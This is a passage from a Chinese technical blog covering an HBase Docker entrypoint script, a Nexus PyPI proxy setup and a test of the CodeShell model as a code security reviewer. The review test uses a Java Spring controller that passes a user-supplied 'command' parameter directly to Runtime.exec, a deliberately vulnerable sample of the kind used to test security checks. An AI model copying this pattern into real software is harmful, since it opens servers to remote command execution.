class="hljs-keyword">then</span><br>        <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/local-regionservers.sh&quot;</span> start 1<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase-daemon.sh&quot;</span> start regionserver<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">start_stargate</span></span>()&#123;<br>    <span class="hljs-comment"># kill any pre-existing rest instances before starting new ones</span><br>    pgrep -f proc_rest &amp;&amp; pkill -9 -f proc_rest<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting HBase Stargate Rest API server...&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase-daemon.sh&quot;</span> start rest<br>    <span class="hljs-built_in">echo</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">start_thrift</span></span>()&#123;<br>    <span class="hljs-comment"># kill any pre-existing thrift instances before starting new ones</span><br>    pgrep -f proc_thrift &amp;&amp; pkill -9 -f proc_thrift<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting HBase Thrift API server...&quot;</span><br>    <span class="hljs-comment">#&quot;$HBASE_HOME/bin/hbase-daemon.sh&quot; start thrift</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase-daemon.sh&quot;</span> start thrift2<br>    <span class="hljs-built_in">echo</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">start_hbase_shell</span></span>()&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">Example Usage:</span><br><span class="hljs-string"></span><br><span class="hljs-string">create &#x27;table1&#x27;, &#x27;columnfamily1&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">put &#x27;table1&#x27;, &#x27;row1&#x27;, &#x27;columnfamily1:column1&#x27;, &#x27;value1&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">get &#x27;table1&#x27;, &#x27;row1&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Now starting HBase Shell...</span><br><span class="hljs-string">&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase&quot;</span> shell<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">trap_func</span></span>()&#123;<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;\n\nShutting down HBase:&#x27;</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase-daemon.sh&quot;</span> stop rest || :<br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase-daemon.sh&quot;</span> stop thrift || :<br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/local-regionservers.sh&quot;</span> stop 1 || :<br>    <span class="hljs-comment"># let&#x27;s not confuse users with superficial errors in the Apache HBase scripts</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/stop-hbase.sh&quot;</span> |<br>        grep -v -e <span class="hljs-string">&quot;ssh: command not found&quot;</span> \<br>                -e <span class="hljs-string">&quot;kill: you need to specify whom to kill&quot;</span> \<br>                -e <span class="hljs-string">&quot;kill: can&#x27;t kill pid .*: No such process&quot;</span><br>    <span class="hljs-built_in">sleep</span> 2<br>    pgrep -fla org.apache.hadoop.hbase |<br>        grep -vi org.apache.hadoop.hbase.zookeeper |<br>            awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> |<br>                xargs <span class="hljs-built_in">kill</span> 2&gt;/dev/null || :<br>    <span class="hljs-built_in">sleep</span> 3<br>    pkill -f org.apache.hadoop.hbase.zookeeper 2&gt;/dev/null || :<br>    <span class="hljs-built_in">sleep</span> 2<br>&#125;<br><span class="hljs-built_in">trap</span> trap_func INT QUIT TRAP ABRT TERM EXIT<br><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;$*&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = master ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = m ]; <span class="hljs-keyword">then</span><br>        start_master<br>        <span class="hljs-built_in">tail</span> -f /dev/null <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs/&quot;</span>* &amp;<br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = regionserver ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = rs ]; <span class="hljs-keyword">then</span><br>        start_regionserver<br>        <span class="hljs-built_in">tail</span> -f /dev/null <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs/&quot;</span>* &amp;<br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = rest ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = stargate ]; <span class="hljs-keyword">then</span><br>        start_stargate<br>        <span class="hljs-built_in">tail</span> -f /dev/null <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs/&quot;</span>* &amp;<br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = thrift ]; <span class="hljs-keyword">then</span><br>        start_thrift<br>        <span class="hljs-built_in">tail</span> -f /dev/null <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs/&quot;</span>* &amp;<br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = shell ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase&quot;</span> shell<br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = bash ]; <span class="hljs-keyword">then</span><br>        bash<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;usage:  must specify one of: master, regionserver, thrift, rest, shell, bash&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span><br>    sed -i <span class="hljs-string">&#x27;s/zookeeper:2181/localhost:2181/&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/conf/hbase-site.xml&quot;</span><br>    start_zookeeper<br>    start_master<br>    start_regionserver<br>    start_stargate<br>    start_thrift<br>    <span class="hljs-keyword">if</span> [ -t 0 ]; <span class="hljs-keyword">then</span><br>        start_hbase_shell<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">    Running non-interactively, will not open HBase shell</span><br><span class="hljs-string"></span><br><span class="hljs-string">    For HBase shell start this image with &#x27;docker run -t -i&#x27; switches</span><br><span class="hljs-string">    &quot;</span><br>        <span class="hljs-built_in">tail</span> -f /dev/null <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs/&quot;</span>* &amp;<br>        <span class="hljs-comment"># this shuts down from Control-C but exits prematurely, even when +euo pipefail and doesn&#x27;t shut down HBase</span><br>        <span class="hljs-comment"># so I rely on the sig trap handler above</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">wait</span> || :<br></code></pre></td></tr></table></figure><p>说明：entrypoint.sh 中默认启用的是thrift2，如果需要thrift，请自行修改</p><h3 id="构建运行镜像"><a href="#构建运行镜像" class="headerlink" title="构建运行镜像"></a>构建运行镜像</h3><p>将以上内容，按照上述目录结构进行保存，需要注意，提前赋予entrypoint.sh执行权限，然后进行构建，构建命令如下：</p><p><code>docker build -t hksanduo/hbase:3.0.0-alpha-4 .</code></p><p>构建成功如下：<br><img src="/img/20231121-02.png" alt="构建成功"></p><p>如果映射端口有所调整，请自行修改docker-compose.yaml，如果没有，直接执行<code>docker-compose up -d</code></p><p>稍等片刻，访问：http:&#x2F;&#x2F;{your server ip}:10610&#x2F; 如果能够正常加载HBase Master web 界面证明运行成功。<br><img src="/img/20231121-03.png" alt=" master status "></p><h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><h4 id="NotImplementedError-fstat-unimplemented-unsupported-or-native-support-failed-to-load-see-https-github-com-jruby-jruby-wiki-Native-Libraries"><a href="#NotImplementedError-fstat-unimplemented-unsupported-or-native-support-failed-to-load-see-https-github-com-jruby-jruby-wiki-Native-Libraries" class="headerlink" title="NotImplementedError: fstat unimplemented unsupported or native support failed to load; see https://github.com/jruby/jruby/wiki/Native-Libraries"></a>NotImplementedError: fstat unimplemented unsupported or native support failed to load; see <a href="https://github.com/jruby/jruby/wiki/Native-Libraries">https://github.com/jruby/jruby/wiki/Native-Libraries</a></h4><p><img src="/img/20231121-05.png" alt="错误"><br>本次使用的基础镜像<code>harisekhon/alpine-java:jre8</code>已经好多年没更新了，安装低版本hbase(&lt;&#x3D;2.5.6)以下，并不会遇到这个问题，如果手动将alpine配置成3.13以上或者安装jruby(&gt;&#x3D;9.2.13)以上，就会遇到这个问题，这个问题网上的解决方案都是安装jruby和asciidoctor来解决，我们这里已经安装，同样这个问题可能是jruby过高而导致的兼容性问题，遇到这个问题，可以将hbase的安装下载回来，解压查看 hbase-{version}&#x2F;lib&#x2F;ruby 下jruby-complete版本，只要安装的jruby版本不高于jruby-complete即可，这个修复方案可能随着时间发展，兼容更强，各位谨慎参考。</p><p><img src="/img/20231121-04.png" alt=" jruby-complete "></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/harisekhon/Dockerfiles">https://github.com/harisekhon/Dockerfiles</a>【harisekhon hbase github】</li><li><a href="https://hub.docker.com/r/harisekhon/hbase">https://hub.docker.com/r/harisekhon/hbase</a>【harisekhon hbase】</li><li><a href="https://github.com/apache/hbase">https://github.com/apache/hbase</a>【hbase】</li><li><a href="https://github.com/harisekhon/Dockerfiles/tree/master/alpine-java">https://github.com/harisekhon/Dockerfiles/tree/master/alpine-java</a>【alpine java】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BigData</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在nexus添加pipy代理源</title>
    <link href="/2023/11/10/2023-11-10-install-nexus-and-add-repos/"/>
    <url>/2023/11/10/2023-11-10-install-nexus-and-add-repos/</url>
    
    <content type="html"><![CDATA[<h1 id="安装nexus并且添加pipy代理源"><a href="#安装nexus并且添加pipy代理源" class="headerlink" title="安装nexus并且添加pipy代理源"></a>安装nexus并且添加pipy代理源</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用机器学习，测试不同项目时，依赖都不同，之前也尝试使用复制conda 环境等方式来加快环境的部署，但是torch等包动辄几百兆，使用tuna等代理源也比较耗费时间并且占用带宽，为了应对这个问题，需要在内部搭建一个代理源，方便数据的共用，减少带宽的占用，写这篇文章主要原因是网络上对于配置pypi代理源的资料太少，博主在配置的过程中处处碰壁，这里记录一下，方便以后查阅。我这里会从nexus的安装讲起，方便大家安装和使用。</p><h2 id="nexus安装"><a href="#nexus安装" class="headerlink" title="nexus安装"></a>nexus安装</h2><p>我这里使用的是docker进行部署，方便配置和运维。docker-compose.yaml如下：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3.8&#x27;</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">nexus</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;sonatype/nexus3&#x27;</span><br>    <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;nexus&#x27;</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attribute">privileged</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">: </span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">TZ=Asia/Shanghai</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">48081:8081</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;./nexus-data:/nexus-data&#x27;</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">nexus</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">nexus</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br></code></pre></td></tr></table></figure><p>我这里做了数据持久化操作，将数据保存到本地。<br>启用直接运行命令 <code>docker-compose up -d</code> 容器会在后台进行运行。稍等片刻，访问：http:&#x2F;&#x2F;{your server ip}:48081<br><img src="/img/20231110-01.png" alt="nexus"></p><p>默认用户名为admin，密码为：admin123，如果发现密码不对，<code>cat ./nexus-data/admin.password</code>,首次进入系统后，会提示修改密码，注意修改即可。</p><h2 id="增加pypi代理源"><a href="#增加pypi代理源" class="headerlink" title="增加pypi代理源"></a>增加pypi代理源</h2><p>仓库类型说明：</p><ul><li>hosted: 本地仓库，通常我们会部署自己的构件到这一类型的仓库。比如公司的私有库。    </li><li>proxy: 代理仓库，它们被用来代理远程的公共仓库，如maven中央仓库。      </li><li>group:仓库组，用来合并多个hosted&#x2F;proxy仓库，当你的项目希望在多个repository使用资源时就不需要多次引用了，只需要引用一个group即可。</li></ul><p>blob stores<br>在创建repository之前，还需要先指定文件存储目录，便于统一管理。就需要创建Blob Stores，不创建则使用的是default，blob stores相当于一个存储空间，如果没有特殊要求，使用默认的即可。</p><p>点击创建源<br><img src="/img/20231110-02.png" alt="创建源"></p><p>选择pypi proxy<br><img src="/img/20231110-03.png" alt="创建源"></p><p>设置代理源的名称，选择blob stores，我这里直接默认，各位师傅根据实际情况配置，点击<code>create repository</code>创建源。<br><img src="/img/20231110-04.png" alt="创建源"></p><p>点击我们新创建的源pypi<br><img src="/img/20231110-05.png" alt="创建源"></p><p>进入源配置页面，我们将tuna源(<code>https://pypi.tuna.tsinghua.edu.cn/</code>)加进来，加入源需要注意，需要去掉<code>simple</code>，代理源地址nexus已经默认生成，默认是：<code>http://ip:port/repository/pypi/</code>，pip配置的时候，需要将<code>simple</code>拼接到最后，最后配置的代理源地址为：<code>http://ip:port/repository/pypi/simple</code> 我们只需要修改远程的存储库或者镜像源即可，点击保存即可完成配置。<br><img src="/img/20231110-06.png" alt="配置源"></p><p>如果新人使用默认配置，到这里应该没问题了，但是对于部分单位，存在多个用户，多个私有源，我们可能访问失败，这里需要配置权限。由于是代理源，直接使用匿名用户权限修改即可。<br><img src="/img/20231110-07.png" alt="配置源"></p><p>添加权限，修改完成，点击保存即可。<br><img src="/img/20231110-08.png" alt="添加权限"></p><h2 id="本地pip配置"><a href="#本地pip配置" class="headerlink" title="本地pip配置"></a>本地pip配置</h2><p>linux下，使用代理源，我们通常有临时方法和永久方案(写入配置文件当中)，比如：<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</code>,但是对于我们内网配置的代理源会有一个小问题，pip信任这个源，所以无法安装，这个问题就是pip对于非https的源不会进行安装。<br><img src="/img/20231110-09.png" alt=" not a trusted or secure host"><br>解决方法，可以增加参数，<code>--trusted-host</code>，如下：<br><img src="/img/20231110-10.png" alt=" 临时使用源命令 "><br>修改配置文件，linux位于：~&#x2F;.config&#x2F;pip&#x2F;pip.conf，配置文件举例如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">global</span>]<br><span class="hljs-keyword">index</span>-url = http://<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.199</span>:<span class="hljs-number">48081</span>/repository/pypi/simple<br>[install]<br><span class="hljs-keyword">trusted</span>-host = <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.199</span><br></code></pre></td></tr></table></figure><p>也可以直接使用命令行：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pip config <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span>.<span class="hljs-keyword">index</span>-url http://<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.199</span>:<span class="hljs-number">48081</span>/repository/pypi/simple<br>pip config <span class="hljs-keyword">set</span> install.<span class="hljs-keyword">trusted</span>-host <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.199</span><br></code></pre></td></tr></table></figure><p><img src="/img/20231110-11.png" alt=" 配置效果 "></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、安装正确<br>2、选取合适的镜像源，比如：tuna，ustc，商业的都行<br>3、权限配置正确<br>4、注意pip配置</p><p>祝大家炼丹快乐。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/pypi/">https://mirrors.tuna.tsinghua.edu.cn/help/pypi/</a>【tuna mirrors pypi】</li><li><a href="https://zhuanlan.zhihu.com/p/526011309">https://zhuanlan.zhihu.com/p/526011309</a>【docker安装nexus3，搭建私人maven仓库】</li><li><a href="https://blog.csdn.net/BThinker/article/details/123688143">https://blog.csdn.net/BThinker/article/details/123688143</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用codeshell进行代码安全评估</title>
    <link href="/2023/11/07/2023-11-07-use-codeshell-for-code-review/"/>
    <url>/2023/11/07/2023-11-07-use-codeshell-for-code-review/</url>
    
    <content type="html"><![CDATA[<h1 id="使用codeshell进行代码安全评估"><a href="#使用codeshell进行代码安全评估" class="headerlink" title="使用codeshell进行代码安全评估"></a>使用codeshell进行代码安全评估</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>北京大学软件工程国家工程研究中心知识计算实验室联合四川天府银行AI实验室，正式开源70亿参数的代码大模型CodeShell，成为同等规模最强代码基座。与此同时，团队将软件开发代码助手的完整解决方案全部开源，人手一个本地化轻量化的智能代码助手的时代已经来临！</p><p>CodeShell代码：<a href="https://github.com/WisdomShell/codeshell">https://github.com/WisdomShell/codeshell</a><br>CodeShell基座模型：<a href="https://huggingface.co/WisdomShell/CodeShell-7B">https://huggingface.co/WisdomShell/CodeShell-7B</a><br>代码助手VSCode插件：<a href="https://github.com/WisdomShell/codeshell-vscode">https://github.com/WisdomShell/codeshell-vscode</a> </p><p>目前拥有以下优势：</p><ul><li><strong>强大的性能</strong>：CodelShell在HumanEval和MBPP上达到了7B代码基座大模型的最优性能</li><li><strong>完整的体系</strong>：除了代码大模型，同时开源IDE（VS Code与JetBrains）插件，形成开源的全栈技术体系</li><li><strong>轻量化部署</strong>：支持本地C++部署，提供轻量快速的本地化软件开发助手解决方案</li><li><strong>全面的评测</strong>：提供支持完整项目上下文、覆盖代码生成、代码缺陷检测与修复、测试用例生成等常见软件开发活动的多任务评测体系（即将开源）</li><li><strong>高效的训练</strong>：基于高效的数据治理体系，CodeShell在完全冷启动情况下，只训练了五千亿Token即获得了优异的性能</li></ul><p>安全狗，重点关注安全检测功能。codeshell号称可以检测代码中的潜在安全风险，如可能出现的SQL注入、跨站脚本攻击等，帮助排查安全性风险。对代码进行深入分析，检测潜在的错误、冗余代码和性能瓶颈，并为开发者提供相应的修复建议；基于代码逻辑，自动创建测试用例，以辅助进行代码测试和验证，确保代码的正确性和稳定性。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>获取模型<br>我这里选取的是CodeShell-7B-Chat，如果资源不够，可以采用量化模型。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://huggingface.co/WisdomShell/CodeShell-<span class="hljs-number">7</span>B-Chat<br></code></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先克隆项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WisdomShell/codeshell<br><span class="hljs-built_in">cd</span> codeshell<br>conda create -n codeshell python=3.10<br>conda activate codeshell<br>pip install requirements.txt<br></code></pre></td></tr></table></figure><p>昨天作者遗漏requirements.txt，作者响应很及时，很快就补上了，如果需要评估web demo，还需要另外安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install demos/requirements_web_demo.txt<br></code></pre></td></tr></table></figure><p>个人环境还缺乏部分依赖，手动安装就行，灵活处理。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> bitsandbytes<br></code></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python web_demo.<span class="hljs-property">py</span> --server-port=<span class="hljs-number">80</span> --server-name=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> -c /data/models/<span class="hljs-title class_">CodeShell</span>-7B-<span class="hljs-title class_">Chat</span> <br></code></pre></td></tr></table></figure><p><img src="/img/20231107-01.png" alt="加载"></p><p>正常加载demo</p><p><img src="/img/20231107-02.png" alt="web demo"></p><p>注意：我这里使用显卡为3090ti，显存为24G，运行全量模型占用显存大约16G，仅供参考。</p><h2 id="错误："><a href="#错误：" class="headerlink" title="错误："></a>错误：</h2><h3 id="ImportError-Using-low-cpu-mem-usage-True-or-a-device-map-requires-Accelerate-pip-install-accelerate"><a href="#ImportError-Using-low-cpu-mem-usage-True-or-a-device-map-requires-Accelerate-pip-install-accelerate" class="headerlink" title="ImportError: Using low_cpu_mem_usage=True or a device_map requires Accelerate: pip install accelerate"></a>ImportError: Using <code>low_cpu_mem_usage=True</code> or a <code>device_map</code> requires Accelerate: <code>pip install accelerate</code></h3><p>手动安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> accelerate <br></code></pre></td></tr></table></figure><h3 id="torch-cuda-OutOfMemoryError-CUDA-out-of-memory"><a href="#torch-cuda-OutOfMemoryError-CUDA-out-of-memory" class="headerlink" title="torch.cuda.OutOfMemoryError: CUDA out of memory."></a>torch.cuda.OutOfMemoryError: CUDA out of memory.</h3><p>换模型或者换显卡资源</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><p>prompt参考：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">检查以下java代码，是否存在安全性问题,请给出优化建议:</span><br></code></pre></td></tr></table></figure><p>评估代码片段为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyu.secexample.rce.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rcecontroller</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/rce&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">input</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;rce/rce&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/rceoutput&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;command&quot;)</span> String command, Model model)</span>&#123;<br>        <span class="hljs-keyword">if</span>(command==<span class="hljs-string">&quot;&quot;</span> | command==<span class="hljs-literal">null</span>)&#123;<br>            command= <span class="hljs-string">&quot;whoami&quot;</span>;<br>        &#125;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            p = Runtime.getRuntime().exec(command);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> p.getInputStream();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (!((s = reader.readLine()) != <span class="hljs-literal">null</span>)) <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            result = s;<br>        &#125;<br>        model.addAttribute(<span class="hljs-string">&quot;result&quot;</span>,result);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;rce/rceoutput&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下：<br><img src="/img/20231107-03.png" alt="结果"></p><p>占用资源：</p><p><img src="/img/20231107-04.png" alt="占用资源"></p><p>遇到不准确及幻觉<br><img src="/img/20231107-05.png" alt="回答不准确"></p><h2 id="使用vscode插件"><a href="#使用vscode插件" class="headerlink" title="使用vscode插件"></a>使用vscode插件</h2><h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><p>vscode应用市场检索：CodeShell VSCode，直接安装即可，也可以自行编译安装。<br><img src="/img/20231107-06.png" 